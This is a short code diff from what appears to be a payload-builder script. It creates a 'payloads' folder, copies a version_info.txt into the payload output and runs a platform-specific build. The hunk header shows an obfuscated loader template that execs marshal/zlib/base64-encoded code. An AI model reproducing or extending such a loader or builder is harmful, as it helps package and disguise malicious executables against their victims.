@@ -294,6 +294,8 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
         if not os.path.isdir("payloads"):
             os.makedirs("payloads")
 
+        shutil.copy("./version_info.txt", f"{payload_file_name}/version_info.txt")
+
         try:
             if os_name == "Windows":
                 result = subprocess.run(
